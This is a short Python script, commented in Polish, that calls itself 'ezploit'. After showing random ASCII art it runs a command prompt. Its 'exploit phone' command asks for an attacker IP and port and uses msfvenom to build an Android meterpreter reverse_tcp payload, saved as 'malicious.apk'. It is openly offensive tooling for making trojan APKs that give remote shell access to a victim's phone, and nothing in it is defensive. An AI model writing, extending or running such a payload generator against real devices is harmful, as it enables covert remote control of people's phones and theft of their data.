import os
import colorama
import string
import random
import subprocess

# Inicjalizacja Colorama
colorama.init(autoreset=True)

# Lista z ASCII artami
ascii_arts = [
    """      _.---._
       .:":_'-.-`_:":.
      :`.`._'-.-'_.'.':
      '`.`._`-.-'_.'.''
       `.`-.`-.-'.-'.'
        `._`-.-'_.'
            `'''`       """,
    r"""
(\ 
\'\ 
 \'\     __________  
 / '|   ()_________)
 \ '/    \ ~~~~~~~~ \\
   \       \ ~~~~~~   \\
   ==).      \__________\\
  (__)       ()__________)

""",
    r"""   
    _____________________
  /                 `   \
  |  .-----------.  |   |-----.
  |  |           |  |   |-=---|
  |  | EZPLOIT   |  |   |-----|
  |  |           |  |   |-----|
  |  |           |  |   |-----|
  |  `-----------'  |   |-----'/\
   \________________/___'     /  \
      /                      / / /
     / //               //  / / /
    /                      / / /
   / _/_/_/_/_/_/_/_/_/_/ /   /
  / _/_/_/_/_/_/_/_/_/_/ /   /
 / _/_/_/_______/_/_/_/ / __/
/______________________/ /    
\______________________\/"""
]

# Wyświetl losowy ASCII art
print(ascii_arts[random.randint(0, 2)])

# Główna pętla komend
while True:
    com = input("[ezploit] > ")

    if com == "exploit phone":
        # Używanie subprocess do generowania pliku APK
        print(colorama.Fore.RED + "Starting phone exploit...")

        # Definiowanie parametrów dla msfvenom
        lhost = input("Podaj swój adres IP (LHOST): ")
        lport = input("Podaj port (LPORT): ")
        apk_file = "malicious.apk"

        # Komenda do generowania pliku APK
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {apk_file}"

        # Wykonanie komendy
        try:
            subprocess.run(command, shell=True, check=True)
            print(colorama.Fore.GREEN + f"Złośliwy plik APK został stworzony: {apk_file}")
        except subprocess.CalledProcessError as e:
            print(colorama.Fore.RED + f"Błąd podczas tworzenia APK: {e}")

    elif com == "exit":
        print(colorama.Fore.CYAN + "Exiting ezploit...")
        break
    elif com == "ipget":
        subprocess.run("ifconfig")
    else:
        print(colorama.Fore.RED + f"Unknown command: {com}")
